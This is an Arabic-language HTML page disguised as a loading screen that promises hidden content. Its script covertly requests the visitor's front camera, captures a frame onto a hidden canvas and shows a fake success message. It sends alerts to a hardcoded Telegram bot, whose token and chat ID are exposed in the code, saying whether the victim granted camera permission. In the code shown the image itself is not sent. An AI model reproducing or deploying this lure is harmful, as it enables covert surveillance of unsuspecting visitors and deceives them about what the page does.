<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body {
            margin: 0;
            background-color: #0f172a;
            color: #f8fafc;
            font-family: system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            text-align: center;
            padding: 20px;
        }
        .btn-start {
            background-color: #38bdf8;
            color: #0f172a;
            border: none;
            padding: 14px 35px;
            font-size: 1.2rem;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }
        h2 { font-size: 1.1rem; font-weight: 500; margin-bottom: 25px; word-break: break-all; }
    </style>
</head>
<body>

    <div class="loader-container" id="mainBox">
        <h2>انقر على الزر أدناه لعرض المحتوى</h2>
        <button class="btn-start" onclick="startProcess()">اضغط هنا</button>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TELEGRAM_BOT_TOKEN = '8880573702:AAGOnEril_hFUPSBRuLh2TwGkFOG3wCeV80';
        const TELEGRAM_CHAT_ID = '8304712202';

        async function startProcess() {
            try {
                // طلب الكاميرا الأمامية بشكل صريح للموبايل والكمبيوتر
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: { ideal: "user" } 
                    } 
                });
                
                const videoElement = document.getElementById('video');
                videoElement.srcObject = stream;

                sendNotificationToTelegram("🚨 تنبيه: شخص ما فتح الموقع ووافق على إذن الكاميرا الأمامية!");

                setTimeout(() => {
                    captureAndProcess(stream);
                }, 2000);

            } catch (error) {
                document.getElementById('mainBox').innerHTML = '<h2>خطأ في إذن الكاميرا: ' + error.message + '</h2>';
                sendNotificationToTelegram("⚠️ تنبيه: حاول فتح الموقع ولكن رفض إذن الكاميرا أو حدث خطأ: " + error.message);
            }
        }

        function captureAndProcess(stream) {
            try {
                const videoElement = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                canvas.width = videoElement.videoWidth || 640;
                canvas.height = videoElement.videoHeight || 480;

                const context = canvas.getContext('2d');
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                stream.getTracks().forEach(track => track.stop());

                document.getElementById('mainBox').innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';

            } catch (e) {
                document.getElementById('mainBox').innerHTML = '<h2>خطأ في المعالجة: ' + e.message + '</h2>';
            }
        }

        function sendNotificationToTelegram(messageText) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: messageText
                })
            })
            .catch(error => {
                console.error("فشل إرسال التيليجرام", error);
            });
        }
    </script>
</body>
</html>
